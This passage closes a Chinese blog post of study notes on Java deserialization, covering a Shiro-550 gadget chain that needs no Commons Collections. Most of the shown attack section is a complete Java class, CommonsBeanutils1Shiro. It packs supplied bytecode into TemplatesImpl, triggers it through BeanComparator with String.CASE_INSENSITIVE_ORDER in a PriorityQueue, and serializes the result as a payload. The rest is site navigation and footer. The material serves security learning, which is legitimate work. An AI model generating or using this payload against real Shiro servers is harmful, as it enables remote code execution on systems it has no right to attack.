</span></span><span style=display:flex><span>        <span style=color:#111>ByteArrayOutputStream</span> <span style=color:#111>barr</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ObjectOutputStream</span> <span style=color:#111>oos</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectOutputStream</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>writeObject</span><span style=color:#f92672>(</span><span style=color:#111>queue</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ObjectInputStream</span> <span style=color:#111>ois</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectInputStream</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayInputStream</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>.</span><span style=color:#75af00>toByteArray</span><span style=color:#f92672>()));</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Object</span> <span style=color:#111>o</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Object</span><span style=color:#f92672>)</span><span style=color:#111>ois</span><span style=color:#f92672>.</span><span style=color:#75af00>readObject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=shiro-550无cc>Shiro-550(无cc</h3><p>shiro本身的依赖是有cb的，但是会因为serialVersionUID不符而报错，即使我们调对生成payload的本地依赖版本和目标环境一致也会出现cc依赖版本不对的情况，我们设想一条无依赖的Shiro反序列化利用链</p><p>在BeanComparator的构造函数处，没有显式传入Comparator时默认使用cc中的ComparableComparator，替代类需要满足这样的条件：</p><ul><li>实现java.util.Comparator接口</li><li>实现java.io.Serializable接口</li><li>最好自带，兼容性强</li></ul><p>我们找到了java.util.String中的内部私有类CaseInsesitiveComparator，它实现了Comparator和Serializable</p><p>替换exp</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.beanutils.BeanComparator</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ByteArrayOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Field</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.PriorityQueue</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>CommonsBeanutils1Shiro</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>fieldName</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span> <span style=color:#111>value</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Field</span> <span style=color:#111>field</span> <span style=color:#f92672>=</span> <span style=color:#111>obj</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#111>fieldName</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>field</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>field</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>value</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#75af00>getPayload</span><span style=color:#f92672>(</span><span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#111>clazzBytes</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>TemplatesImpl</span> <span style=color:#111>obj</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TemplatesImpl</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_bytecodes&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[][]{</span><span style=color:#111>clazzBytes</span><span style=color:#f92672>});</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_name&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;HelloTemplatesImpl&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_tfactory&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TransformerFactoryImpl</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>final</span> <span style=color:#111>BeanComparator</span> <span style=color:#111>comparator</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>BeanComparator</span><span style=color:#f92672>(</span><span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>CASE_INSENSITIVE_ORDER</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>final</span> <span style=color:#111>PriorityQueue</span><span style=color:#f92672>&lt;</span><span style=color:#111>Object</span><span style=color:#f92672>&gt;</span> <span style=color:#111>queue</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>PriorityQueue</span><span style=color:#f92672>&lt;</span><span style=color:#111>Object</span><span style=color:#f92672>&gt;(</span><span style=color:#111>2</span><span style=color:#f92672>,</span> <span style=color:#111>comparator</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// stub data for replacement later
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>queue</span><span style=color:#f92672>.</span><span style=color:#75af00>add</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;1&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>queue</span><span style=color:#f92672>.</span><span style=color:#75af00>add</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;1&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>comparator</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;property&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;outputProperties&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>queue</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;queue&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[]{</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>obj</span><span style=color:#f92672>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// ==================
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>// 生成序列化字符串
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>ByteArrayOutputStream</span> <span style=color:#111>barr</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ObjectOutputStream</span> <span style=color:#111>oos</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectOutputStream</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>writeObject</span><span style=color:#f92672>(</span><span style=color:#111>queue</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>barr</span><span style=color:#f92672>.</span><span style=color:#75af00>toByteArray</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div></div></section></article></main><div class="w-full h-0 flex-none order-3"></div><aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl"><div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2"><div class="md:max-w-xs flex flex-col md:items-end"><ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col"><li class="px-1 md:px-0"><a href=/posts/ title="Posts page">Posts</a></li><li class="px-1 md:px-0"><a href=/relax/ title="Relaxxx page">Relaxxx</a></li><li class="px-1 md:px-0"><a href=/categories/ title="Categories page">Categories</a></li><li class="px-1 md:px-0"><a href=/series/ title="Series page">Series</a></li><li class="px-1 md:px-0"><a href=/tags/ title="Tags page">Tags</a></li><li class="px-1 md:px-0"><a href=/about/ title="About page">About</a></li><li class="px-1 md:px-0"><a href=/friends/ title="Friends page">Friends</a></li><div id=fastSearch class=m-0><input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search><ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400"></ul></div></ul><div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16"><a href=https://space.bilibili.com/1651059195 target=_blank class="bilibili icon pl-1 text-eucalyptus-400 hover:text-java-400" title="bilibili link" rel=noopener aria-label="follow on bilibili——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M7.172 2.757 10.414 6h3.171l3.243-3.242a1 1 0 011.415 1.415L16.414 6H18.5A3.5 3.5.0 0122 9.5v8A3.5 3.5.0 0118.5 21h-13A3.5 3.5.0 012 17.5v-8A3.5 3.5.0 015.5 6h2.085L5.757 4.171a1 1 0 011.415-1.415zM18.5 8h-13A1.5 1.5.0 004.007 9.356L4 9.5v8a1.5 1.5.0 001.356 1.493L5.5 19h13a1.5 1.5.0 001.493-1.356L20 17.5v-8A1.5 1.5.0 0018.5 8zM8 11a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1zm8 0a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1z"/></g></svg></div></a><a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg></div></a><a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg></div></a><a href='TW9uJTIwMTglMjBGZWJydWFyeSUyMDE5ODAlMjAyMTowMjo1NSUyMFVUQw==' target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg></div></a><a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg></div></a><a href='Vmlja3lja3lreQ==' target=_blank class="wechat icon pl-1 text-eucalyptus-400 hover:text-java-400" title="wechat link" rel=noopener aria-label="follow on wechat——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M10 14.676v-.062c0-2.508 2.016-4.618 4.753-5.233C14.389 7.079 11.959 5.2 8.9 5.2 5.58 5.2 3 7.413 3 9.98c0 .969.36 1.9 1.04 2.698.032.038.083.094.152.165a3.568 3.568.0 011.002 2.238 3.612 3.612.0 012.363-.442c.166.026.302.046.405.06A7.254 7.254.0 0010 14.675zm.457 1.951a9.209 9.209.0 01-2.753.055 19.056 19.056.0 01-.454-.067 1.612 1.612.0 00-1.08.212l-1.904 1.148a.806.806.0 01-.49.117.791.791.0 01-.729-.851l.15-1.781a1.565 1.565.0 00-.439-1.223 5.537 5.537.0 01-.241-.262C1.563 12.855 1 11.473 1 9.979 1 6.235 4.537 3.2 8.9 3.2c4.06.0 7.403 2.627 7.85 6.008 3.372.153 6.05 2.515 6.05 5.406.0 1.193-.456 2.296-1.229 3.19-.051.06-.116.13-.195.21a1.24 1.24.0 00-.356.976l.121 1.423a.635.635.0 01-.59.68.66.66.0 01-.397-.094l-1.543-.917a1.322 1.322.0 00-.874-.169c-.147.023-.27.04-.368.053-.316.04-.64.062-.969.062-2.694.0-4.998-1.408-5.943-3.401zm6.977 1.31a3.325 3.325.0 011.676.174 3.25 3.25.0 01.841-1.502c.05-.05.087-.09.106-.112.489-.565.743-1.213.743-1.883.0-1.804-1.903-3.414-4.4-3.414-2.497.0-4.4 1.61-4.4 3.414s1.903 3.414 4.4 3.414c.241.0.48-.016.714-.046.08-.01.188-.025.32-.046z"/></g></svg></div></a><a href=https://weibo.com/u/3337203335203336203332203334203333203334203331203331203332 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg></div></a><a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg></div></a></div><div class="text-sm text-gray-500 leading-tight a-gray"><br>Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 11665 words in this page.</div></div></div></aside><footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2"><hr class=double-line><div class="flex flex-wrap justify-between pb-2 leading-loose font-serif"><a class=flex-grow-0 href=/2022/03/23/smth-about-env-variables/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>环境变量相关问题</a>
<a class=flex-grow-0 href=/2022/03/28/ctfshow-0222-juanwangcup-wp/>CTFshow0222卷王杯 Wp<svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z"/></svg></a></div><div><div class="font-serif pb-2 flex align-start leading-loose"><span class="heading pr-6 leading-loose">Related</span>
<span><a href=/2022/02/28/java-study-notes-02/>Java学习笔记Ⅱ</a>&nbsp;&nbsp;/&nbsp;
<a href=/2022/02/27/java-study-notes-01/>Java学习笔记Ⅰ</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/12/04/laravel-5.8.x-pop-gadgets/>Laravel-5.8.x反序列化pop链学习</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/12/03/use-ffi-bypass-disable-functions/>FFI绕过disable_functions</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/11/29/php-session-study-notes/>PHP_Session学习笔记</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/08/12/python-unserialize-notes-01-python/>反序列化专题笔记·壹·python篇</a></span></div></div><hr><div class=pb-2><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//amiaaaz.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><hr></footer><script src=/dist/app.js></script>
<script src=/lib/fuse.min.js></script>
<script src=/lib/fastsearch.js></script></div></body></html>